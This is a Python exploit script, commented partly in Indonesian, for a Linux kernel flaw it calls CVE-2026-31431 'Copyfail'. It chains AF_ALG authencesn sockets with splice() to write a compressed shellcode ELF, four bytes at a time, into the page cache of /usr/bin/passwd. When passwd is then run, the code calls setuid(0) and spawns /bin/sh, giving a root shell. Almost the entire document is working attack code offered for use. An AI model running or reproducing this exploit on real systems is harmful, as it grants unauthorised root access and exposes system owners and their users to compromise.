#!/usr/bin/env python3
"""
CVE-2026-31431 "Copyfail" Exploit - Targeting /usr/bin/passwd
Author: Based on public PoC by Theori/Xint - modified for /usr/bin/passwd

Alur Serangan (sesuai diagram):
  1. Buka file target (/usr/bin/passwd)
  2. Siapkan AF_ALG socket + splice()
  3. Kernel salah menulis 4-byte shellcode ke Page Cache
  4. Ulangi untuk setiap 4-byte chunk shellcode
  5. Jalankan /usr/bin/passwd
  6. Karena page cache sudah diubah, passwd menjalankan shellcode
  7. Shellcode memberikan akses root

Technical Details:
  - AF_ALG socket bound to authencesn(hmac(sha256),cbc(aes))
  - splice() chains page-cache pages into writable destination scatterlist
  - authencesn scratch-writes seqno_lo (4 bytes) at dst[assoclen+cryptlen]
  - assoclen=8, controlled by ALG_SET_AEAD_ASSOC_LEN
  - AAD bytes 4-7 carry the controlled 4-byte payload
  - HMAC fails (EBADMSG), but the scratch write persists in page cache
  - On-disk file untouched; only RAM cache is poisoned
"""

import os
import zlib
import socket

# --- [A] Target File: /usr/bin/passwd ---
TARGET = "/usr/bin/passwd"

# --- Shellcode: zlib-compressed mini ELF (160 bytes decompressed) ---
# Decompressed it performs: setuid(0); execve("/bin/sh", NULL, NULL); exit(0)
# This mini ELF replaces the beginning of the target binary in page cache.
SHELLCODE = zlib.decompress(
    bytes.fromhex(
        "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
    )
)


def hexdump_bytes(b: bytes) -> str:
    """Helper untuk menampilkan bytes dalam hex."""
    return b.hex()


def copyfail_write(filedes: int, offset: int, chunk: bytes) -> None:
    """
    --- [B][C] Buka file target & Siapkan AF_ALG + splice() ---
    --- [D] Kernel salah menulis 4-byte ke Page Cache ---

    Melakukan satu operasi 4-byte controlled write ke page cache
    pada offset tertentu dalam file target.

    Parameter:
      filedes : file descriptor dari /usr/bin/passwd (read-only)
      offset  : posisi dalam shellcode yang akan ditulis
      chunk   : 4 bytes payload (shellcode chunk)
    """
    # AF_ALG = 38, SOCK_SEQPACKET = 5
    alg_sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)

    # Bind ke authencesn(hmac(sha256),cbc(aes))
    alg_sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))

    # Constant dari linux/if_alg.h
    ALG_SET_KEY = 1
    ALG_SET_IV = 2
    ALG_SET_OP = 3
    ALG_SET_AEAD_ASSOC_LEN = 4
    SOL_ALG = 279

    # Set key: 32-byte zero key + 16-byte zero IV for AES-CBC
    # Format: keylen(4) + ivlen(4) + key(32) + iv(16) ... dihex: 08 00 01 00 00 00 00 10 + 64 zero hex chars
    alg_sock.setsockopt(SOL_ALG, ALG_SET_KEY, bytes.fromhex("0800010000000010" + "0" * 64))

    # Set auth size = 4 (HMAC truncation/Auth tag length)
    alg_sock.setsockopt(SOL_ALG, 5, None, 4)

    # Accept request socket (the crypto session)
    req_sock, _ = alg_sock.accept()

    # Total splice length = offset + 4 (cryptlen + tag portion that lands us on target page)
    splice_len = offset + 4

    # AAD = 8 bytes: 4 bytes ESN (seqno_hi) + 4 bytes controlled payload (seqno_lo)
    # bytes 4-7 (seqno_lo) adalah yang akan di-scratch-write oleh kernel
    aad = b"A" * 4 + chunk

    # MSG_MORE = 32768 (defer completion until recvmsg)
    MSG_MORE = 32768

    # Build cmsg headers:
    #   ALG_SET_OP     (encrypt/decrypt flag)
    #   ALG_SET_IV     (20-byte IV: \x10 prefix + 19 nulls)
    #   ALG_SET_AEAD_ASSOC_LEN (4-byte assoclen = 8)
    cmsg_op = bytes.fromhex("00") * 4          # ALG_OP_DECRYPT = 0
    cmsg_iv = b"\x10" + bytes.fromhex("00") * 19
    cmsg_assoclen = b"\x08\x00\x00\x00"        # assoclen = 8 little-endian

    req_sock.sendmsg(
        [aad],
        [
            (SOL_ALG, ALG_SET_OP, cmsg_op),
            (SOL_ALG, ALG_SET_IV, cmsg_iv),
            (SOL_ALG, ALG_SET_AEAD_ASSOC_LEN, cmsg_assoclen),
        ],
        MSG_MORE,
    )

    # --- [C] splice() - wire target file's page cache into crypto pipeline ---
    pipe_rd, pipe_wr = os.pipe()

    # splice from target file (page cache) -> pipe
    os.splice(filedes, pipe_wr, splice_len, offset_src=0)

    # splice from pipe -> AF_ALG socket (chains page-cache pages into dst scatterlist)
    os.splice(pipe_rd, req_sock.fileno(), splice_len)

    # --- [D] Trigger decrypt -> scratch write into page cache ---
    try:
        # recvmsg triggers the AEAD decrypt; HMAC will fail (EBADMSG),
        # but the 4-byte seqno_lo scratch write already happened.
        req_sock.recv(8 + offset)
    except Exception:
        pass

    # Cleanup
    req_sock.close()
    alg_sock.close()
    os.close(pipe_rd)
    os.close(pipe_wr)


def main() -> None:
    print("[*] CVE-2026-31431 Copyfail Exploit - /usr/bin/passwd variant")
    print(f"[*] Target: {TARGET}")
    print(f"[*] Shellcode length: {len(SHELLCODE)} bytes ({len(SHELLCODE)//4} x 4-byte writes)")

    # --- [A] Buka file target (/usr/bin/passwd) ---
    fd = os.open(TARGET, os.O_RDONLY)
    print(f"[*] Opened {TARGET} (fd={fd})")

    # --- [E] Ulangi untuk setiap 4-byte shellcode ---
    offset = 0
    while offset < len(SHELLCODE):
        chunk = SHELLCODE[offset : offset + 4]
        # Pad chunk ke 4 bytes jika perlu (untuk chunk terakhir)
        if len(chunk) < 4:
            chunk = chunk + b"\x00" * (4 - len(chunk))
        print(
            f"    [+] Writing chunk at offset {offset:3d}: 0x{hexdump_bytes(chunk)} "
            f"({chunk!r})"
        )
        copyfail_write(fd, offset, chunk)
        offset += 4

    os.close(fd)
    print(f"[*] Finished injecting {len(SHELLCODE)} bytes into {TARGET} page cache")

    # --- [F] Jalankan /usr/bin/passwd ---
    print(f"[*] Executing {TARGET} ...")
    print(f"[*] --- [G] Karena page cache sudah diubah, passwd menjalankan shellcode ---")
    print(f"[*] --- [H] Shellcode memberikan akses root ---")
    os.system(TARGET)


if __name__ == "__main__":
    main()
